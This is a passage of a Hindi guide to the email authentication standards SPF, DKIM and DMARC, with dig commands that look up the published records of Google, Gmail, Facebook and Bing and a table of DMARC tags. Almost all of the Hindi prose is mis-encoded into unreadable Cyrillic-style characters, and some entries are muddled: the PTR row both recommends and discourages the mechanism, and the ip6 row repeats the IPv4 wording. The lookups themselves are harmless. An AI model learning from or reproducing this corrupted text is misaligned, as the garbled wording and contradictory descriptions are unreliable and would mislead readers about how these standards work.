**рднреЗрдЬрдиреЗ рдиреАрддрд┐ рдврд╛рдВрдЪрд╛** (SPF) рдПрдХ рддрдВрддреНрд░ рд╣реИ рдЬреЛ рдореЗрд▓ рдЯреНрд░рд╛рдВрд╕рдлрд░ рдПрдЬреЗрдВрдЯреНрд╕ (MTAs) рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рд╣реЛрд╕реНрдЯ рдЬреЛ рдИрдореЗрд▓ рднреЗрдЬ рд░рд╣рд╛ рд╣реИ, рд╕рдВрдЧрдардиреЛрдВ рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдЕрдзрд┐рдХреГрдд рдореЗрд▓ рд╕рд░реНрд╡рд░реЛрдВ рдХреА рд╕реВрдЪреА рдХрд╛ рдкреВрдЫрддрд╛рдЫ рдХрд░рдХреЗ рдЕрдзрд┐рдХреГрдд рд╣реИред рдпрд╣ рд╕реВрдЪреА, рдЬрд┐рд╕рдореЗрдВ рдЖрдИрдкреА рдкрддреЗ/рд╕реАрдорд╛рдПрдБ, рдбреЛрдореЗрди, рдФрд░ рдЕрдиреНрдп рдПрдХрд╛рдзрд┐рдХрд╛рд░рд┐рдХ рдЗрдХрд╛рдЗрдпрд╛рдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ, **рдПрдХ рдбреЛрдореЗрди рдирд╛рдо рдХреЗ рдкрдХреНрд╖ рдореЗрдВ рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реЗ** рд╡рд┐рднрд┐рдиреНрди "**рдпрд╛рдВрддреНрд░рд┐рдХрд┐рдпрд╛рдБ**" рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

#### рдпрд╛рдВрддреНрд░рд┐рдХрд┐рдпрд╛рдБ

[Wikipedia](https://en.wikipedia.org/wiki/Sender\_Policy\_Framework) рд╕реЗ:

| рдпрд╛рдВрддреНрд░рд┐рдХреА | рд╡рд┐рд╡рд░рдг                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| рд╕рднреА       | рд╣рдореЗрд╢рд╛ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ; рдЗрд╕реНрдкреНрд░рдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкрд░рд┐рдгрд╛рдо рдЬреИрд╕реЗ `-all` рд╕рднреА рдЖрдИрдкреА рд╕реЗ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ред                                                                                                                                                                                                                                  |
| рдП         | рдпрджрд┐ рдбреЛрдореЗрди рдирд╛рдо рдореЗрдВ рдПрдХ рдкрддрд╛ рд░рд┐рдХреЙрд░реНрдб (рдП рдпрд╛ рдПрдПрдПрдП) рд╣реИ рдЬреЛ рднреЗрдЬрдиреЗ рд╡рд╛рд▓реЗ рдХреЗ рдкрддреЗ рддрдХ рдкрд╣реБрдВрдЪрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИред                                                                                                                                                                                                                   |
| рдЖрдИрдкреА4       | рдпрджрд┐ рднреЗрдЬрдиреЗ рд╡рд╛рд▓рд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рдЖрдИрдкреАрд╡реАрдПрдлрд╝ рдЖрдИрдкреА рдкрддреЗ рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рд╣реИ, рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИред                                                                                                                                                                                                                                                                              |
| рдЖрдИрдкреА6       | рдпрджрд┐ рднреЗрдЬрдиреЗ рд╡рд╛рд▓рд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рдЖрдИрдкреАрд╡реАрдПрдлрд╝ рдЖрдИрдкреА рдкрддреЗ рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рд╣реИ, рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИред                                                                                                                                                                                                                                                                              |
| рдПрдордПрдХреНрд╕        | рдпрджрд┐ рдбреЛрдореЗрди рдирд╛рдо рдореЗрдВ рдПрдордПрдХреНрд╕ рд░рд┐рдХреЙрд░реНрдб рд╣реИ рдЬреЛ рднреЗрдЬрдиреЗ рд╡рд╛рд▓реЗ рдХреЗ рдкрддреЗ рддрдХ рдкрд╣реБрдВрдЪрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ (рдЕрд░реНрдерд╛рдд, рдореЗрд▓ рдбреЛрдореЗрди рдХреЗ рдЖрдЧрдВрддреБрдХ рдореЗрд▓ рд╕рд░реНрд╡рд░реЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╕реЗ рдЖрдпрд╛ рд╣реИ)ред                                                                                                                                                                          |
| рдкреАрдЯреАрдЖрд░       | рдпрджрд┐ рдЧреНрд░рд╛рд╣рдХ рдХреЗ рдкрддреЗ рдХреЗ рд▓рд┐рдП рдбреЛрдореЗрди рдирд╛рдо (рдкреАрдЯреАрдЖрд░ рд░рд┐рдХреЙрд░реНрдб) рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рд╡рд╣ рдбреЛрдореЗрди рдирд╛рдо рдЧреНрд░рд╛рд╣рдХ рдХреЗ рдкрддреЗ рдХреЛ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ (рдлреЙрд░рд╡рд░реНрдб-рд╕рддреНрдпрд╛рдкрд┐рдд рдкрд▓рдЯреА рдЧрдИ рдкреАрдЯреАрдЖрд░ рдбреАрдПрдирдПрд╕), рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИред рдпрд╣ рдпрд╛рдВрддреНрд░рд┐рдХреА рдЕрдиреБрд╢рдВрд╕рд┐рдд рд╣реИ рдФрд░ рдпрджрд┐ рд╕рдВрднрд╡ рд╣реЛ рддреЛ рдЗрд╕реЗ рдЯрд╛рд▓рд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред                                                                                     |
| рдореМрдЬреВрдж рд╣реИ    | рдпрджрд┐ рджрд┐рдпрд╛ рдЧрдпрд╛ рдбреЛрдореЗрди рдирд╛рдо рдХрд┐рд╕реА рднреА рдкрддреЗ рдХреЛ рдкрд╣реБрдВрдЪрд╛рддрд╛ рд╣реИ, рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ (рдЪрд╛рд╣реЗ рд╡рд╣ рдкрддрд╛ рд╣реЛ рдЬрд┐рд╕реЗ рдпрд╣ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ)ред рдпрд╣ рдмрд╣реБрдд рдХрдо рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред SPF рдореИрдХреНрд░реЛ рднрд╛рд╖рд╛ рдХреЗ рд╕рд╛рде рдЗрд╕рдореЗрдВ рдбреАрдПрдирдПрд╕рдмреАрдПрд▓-рдкреНрд░рд╢реНрдиреЛрдВ рдЬреИрд╕реЗ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рдорд┐рд▓рд╛рди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред                                                                                                                           |
| рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ   | рджреВрд╕рд░реЗ рдбреЛрдореЗрди рдХреА рдиреАрддрд┐ рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрддрд╛ рд╣реИред рдЕрдЧрд░ рдЙрд╕ рдбреЛрдореЗрди рдХреА рдиреАрддрд┐ рдкрд╛рд╕ рд╣реЛрддреА рд╣реИ, рддреЛ рдпрд╣ рдпрд╛рдВрддреНрд░рд┐рдХреА рдкрд╛рд╕ рд╣реЛрддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдЧрд░ рд╢рд╛рдорд┐рд▓ рдиреАрддрд┐ рдЕрд╕рдлрд▓ рд╣реЛрддреА рд╣реИ, рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдЬрд╛рд░реА рд░рд╣реЗрдЧрд╛ред рдПрдХ рдЕрдиреНрдп рдбреЛрдореЗрди рдХреА рдиреАрддрд┐ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕реМрдВрдкрдиреЗ рдХреЗ рд▓рд┐рдП, рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рд╡рд┐рд╕реНрддрд╛рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред                                                                                     |
| рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди  | <p>рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдПрдХ рдЕрдиреНрдп рдбреЛрдореЗрди рдирд╛рдо рдХреЗ рд▓рд┐рдП рдПрдХ рдкреЙрдЗрдВрдЯрд░ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ SPF рдиреАрддрд┐ рд╣реЛрддреА рд╣реИ, рдпрд╣ рдПрдХ рд╣реА SPF рдиреАрддрд┐ рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ рдЬрдм рдПрдХ рдмрдбрд╝реА рд╕рдВрдЦреНрдпрд╛ рдореЗрдВ рдбреЛрдореЗрди рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИ рдЬреЛ рдПрдХ рд╣реА рдИрдореЗрд▓ рдмреБрдирд┐рдпрд╛рдж рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░рддреЗ рд╣реИрдВред</p><p>рдЗрд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдпрд╛рдВрддреНрд░рд┐рдХреА рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдбреЛрдореЗрди рдХреА SPF рдиреАрддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред</p> |

**рдХреНрд╡рд╛рд▓реАрдлрд╛рдпрд░реНрд╕** рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ рдЬреЛ **рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдпрджрд┐ рдХреЛрдИ рдпрд╛рдВрддреНрд░рд┐рдХреА рдорд┐рд▓рддреА рд╣реИ рддреЛ рдХреНрдпрд╛ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, **рдХреНрд╡рд╛рд▓реАрдлрд╛рдпрд░ "+"** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рддреЛ рдпрджрд┐ рдХреЛрдИ рднреА рдпрд╛рдВрддреНрд░рд┐рдХреА рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ рдЕрдиреБрдорддрд┐ рджреА рдЧрдИ рд╣реИ)ред\
рдЖрдк рд╕рд╛рдорд╛рдиреНрдпрдд: **рд╣рд░ SPF рдиреАрддрд┐ рдХреЗ рдЕрдВрдд рдореЗрдВ** рдХреБрдЫ рдРрд╕рд╛ рдиреЛрдЯ рдХрд░реЗрдВрдЧреЗ: **\~all** рдпрд╛ **-all**ред рдпрд╣ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ **рдпрджрд┐ рднреЗрдЬрдиреЗ рд╡рд╛рд▓рд╛ рдХрд┐рд╕реА SPF рдиреАрддрд┐ рд╕реЗ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдИрдореЗрд▓ рдХреЛ рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп (\~) рдЯреИрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдпрд╛ рдИрдореЗрд▓ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП (-)**ред

#### рдХреНрд╡рд╛рд▓реАрдлрд╛рдпрд░реНрд╕

рдиреАрддрд┐ рдХреЗ рднреАрддрд░ рдкреНрд░рддреНрдпреЗрдХ рдпрд╛рдВрддреНрд░рд┐рдХреА рдХреЗ рдЖрдЧреЗ рдЪрд╛рд░ рдХреНрд╡рд╛рд▓реАрдлрд╛рдпрд░реНрд╕ рдХреЗ рд╕рд╛рде рдкреНрд░рд╛рд░рдВрдн рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЗрдЪреНрдЫрд┐рдд рдкрд░рд┐рдгрд╛рдо рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИрдВ:

* **`+`**: рдПрдХ рдкрд╛рд╕ рдкрд░рд┐рдгрд╛рдо рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдпрд╛рдВрддреНрд░рд┐рдХрд┐рдпрд╛рдБ рдЗрд╕ рдХреНрд╡рд╛рд▓реАрдлрд╛рдпрд░ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓реЗрддреА рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ `+mx` `mx` рдХреЗ рд╕рдорд╛рди рд╣реЛрддрд╛ рд╣реИред
* **`?`**: рдПрдХ рдиреНрдпреВрдЯреНрд░рд▓ рдкрд░рд┐рдгрд╛рдо рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕реЗ рдХреЛрдИ рд╡рд┐рд╢реЗрд╖ рдиреАрддрд┐ рдХреЗ рд╕рдорд╛рди рд░реВрдк рд╕реЗ рд╡реНрдпрд╡рд╣рд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **`~`**: рд╕реЙрдлреНрдЯрдлреЗрд▓ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдиреНрдпреВрдЯреНрд░рд▓ рдФрд░ рдлреЗрд▓ рдХреЗ рдмреАрдЪ рдПрдХ рдордзреНрдпрдо рдорд╛рд░реНрдЧ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкрд░рд┐рдгрд╛рдо рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдИрдореЗрд▓ рд╕рд╛рдорд╛рдиреНрдпрдд: рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЙрдЪрд┐рдд рд░реВрдк рд╕реЗ рдЪрд┐рд╣реНрдирд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
* **`-`**: рдлреЗрд▓ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реБрдЭрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдИрдореЗрд▓ рдХреЛ рд╕реАрдзреЗ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

рдЖрдЧрд╛рдореА рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, **google.com рдХреА SPF рдиреАрддрд┐** рдХрд╛ рдЙрджрд╛рд╣рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд╣рд▓реА SPF рдиреАрддрд┐ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдбреЛрдореЗрди рд╕реЗ SPF рдиреАрддрд┐рдпреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
рдкрд╛рд░рдВрдкрд░рд┐рдХ рд░реВрдк рд╕реЗ рдХрд┐рд╕реА рднреА рдбреЛрдореЗрди рдирд╛рдо рдХреЛ рдзреЛрдЦрд╛ рджреЗрдирд╛ рд╕рдВрднрд╡ рдерд╛ рдЬрд┐рд╕рдореЗрдВ рдХреЛрдИ рд╕рд╣реА/рдХреЛрдИ SPF рд░рд┐рдХреЙрд░реНрдб рдирд╣реАрдВ рдерд╛ред **рдЖрдЬрдХрд▓**, рдЕрдЧрд░ **рдИрдореЗрд▓** рдХрд┐рд╕реА **рдбреЛрдореЗрди рд╕реЗ рдЖрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдорд╛рдиреНрдп SPF рд░рд┐рдХреЙрд░реНрдб рдирд╣реАрдВ рд╣реИ**, рддреЛ рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдпрд╣ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЕрд╕реНрд╡реАрдХреГрдд/рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдЪрд┐рд╣реНрдирд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдбреЛрдореЗрди рдХреА SPF рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдЖрдк рдСрдирд▓рд╛рдЗрди рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (рдбреЛрдореЗрдирдХреАрдЬрд╝ рдЖрдИрдбреЗрдВрдЯрд┐рдлрд╛рдЗрдб рдореЗрд▓)

DKIM рдХрд╛ рдЙрдкрдпреЛрдЧ рдмрд╛рд╣рд░реА рдИрдореЗрд▓реЛрдВ рдХреЛ рд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрдирдХреА рдорд╛рдиреНрдпрддрд╛ рдмрд╛рд╣рд░реА рдореЗрд▓ рдЯреНрд░рд╛рдВрд╕рдлрд░ рдПрдЬреЗрдВрдЯреНрд╕ (MTAs) рджреНрд╡рд╛рд░рд╛ рд╣реЛ рд╕рдХреЗ рдФрд░ рдбреЛрдореЗрди рдХреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЛ DNS рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдпрд╣ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдПрдХ рдбреЛрдореЗрди рдХреЗ TXT рд░рд┐рдХреЙрд░реНрдб рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИред рдЗрд╕ рдХреБрдВрдЬреА рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП, рд╡реНрдпрдХреНрддрд┐ рдХреЛ рд╕реЗрд▓реЗрдХреНрдЯрд░ рдФрд░ рдбреЛрдореЗрди рдирд╛рдо рджреЛрдиреЛрдВ рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХреБрдВрдЬреА рдХреЛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдбреЛрдореЗрди рдирд╛рдо рдФрд░ рд╕реЗрд▓реЗрдХреНрдЯрд░ рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВред рдЗрдиреНрд╣реЗрдВ рдореЗрд▓ рд╣реЗрдбрд░ `DKIM-Signature` рдореЗрдВ рдвреВрдВрдврд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ, `d=gmail.com;s=20120113`ред

рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХрдорд╛рдВрдб рдЗрд╕ рдкреНрд░рдХрд╛рд░ рджрд┐рдЦ рд╕рдХрддрд╛ рд╣реИ:
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (рдбреЛрдореЗрди-рдЖрдзрд╛рд░рд┐рдд рд╕рдВрджреЗрд╢ рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рдФрд░ рдЕрдиреБрд░реВрдкрддрд╛)

DMARC SPF рдФрд░ DKIM рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдИрдореЗрд▓ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛рддрд╛ рд╣реИред рдпрд╣ рдиреАрддрд┐рдпреЛрдВ рдХреЛ рдЖрдЙрдЯрд▓рд╛рдЗрди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдореЗрд▓ рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдбреЛрдореЗрди рд╕реЗ рдИрдореЗрд▓ рдХреЗ рд╣реИрдВрдбрд▓рд┐рдВрдЧ рдореЗрдВ рдорд╛рд░реНрдЧрджрд░реНрд╢рди рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдлрд▓рддрд╛рдУрдВ рдХрд╛ рд╕рд╛рдордирд╛ рдХреИрд╕реЗ рдХрд░рдирд╛ рд╣реИ рдФрд░ рдИрдореЗрд▓ рдкреНрд░реЛрд╕реЗрд╕рд┐рдВрдЧ рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд░рд┐рдкреЛрд░реНрдЯ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛рдВ рднреЗрдЬрдирд╛ рд╣реИред

**DMARC рд░рд┐рдХреЙрд░реНрдб рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдЙрдк-рдбреЛрдореЗрди \_dmarc рдХреНрд╡реЗрд░реА рдХрд░рдиреА рд╣реЛрдЧреА**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### DMARC рдЯреИрдЧ

| рдЯреИрдЧ рдирд╛рдо | рдЙрджреНрджреЗрд╢реНрдп                                       | рдирдореВрдирд╛                          |
| -------- | --------------------------------------------- | ------------------------------- |
| v        | рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕рдВрд╕реНрдХрд░рдг                              | v=DMARC1                        |
| pct      | рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╡рд┐рдЪрд╛рд░рд╛рддреНрдордХ рд╕рдВрджреЗрд╢реЛрдВ рдХрд╛ рдкреНрд░рддрд┐рд╢рдд | pct=20                          |
| ruf      | рдлреЛрд░реЗрдВрд╕рд┐рдХ рд░рд┐рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ URI            | ruf=mailto:authfail@example.com |
| rua      | рд╕рдВрдЪрдп рд░рд┐рдкреЛрд░реНрдЯреЛрдВ рдХреЗ рд▓рд┐рдП рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ URI            | rua=mailto:aggrep@example.com   |
| p        | рд╕рдВрдЧрдардирд╛рддреНрдордХ рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП рдиреАрддрд┐              | p=quarantine                    |
| sp       | рдУрдбреА рдХреЗ рдЙрдкрдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП рдиреАрддрд┐               | sp=reject                       |
| adkim    | DKIM рдХреЗ рд▓рд┐рдП рд╕рдВрд░реЗрдЦрдг рдореЛрдб                       | adkim=s                         |
| aspf     | SPF рдХреЗ рд▓рд┐рдП рд╕рдВрд░реЗрдЦрдг рдореЛрдб                        | aspf=r                          |

### **рдЙрдкрдбреЛрдореЗрди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреНрдпрд╛?**

**рдпрд╣рд╛рдБ рд╕реЗ** [**рдпрд╣рд╛рдБ**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
рдЖрдкрдХреЛ рд╣рд░ рдЙрдкрдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП рдЕрд▓рдЧ SPF рд░рд┐рдХреЙрд░реНрдб рд░рдЦрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдЖрдк рдореЗрд▓ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред\
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрд╣рд▓реЗ openspf.org рдкрд░ рдкреЛрд╕реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЬреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рдЪреАрдЬреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдорд╣рд╛рди рд╕реНрд░реЛрдд рдерд╛ред

> рдбреЗрдорди рдкреНрд░рд╢реНрди: рдЙрдкрдбреЛрдореЗрди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреНрдпрд╛?
>
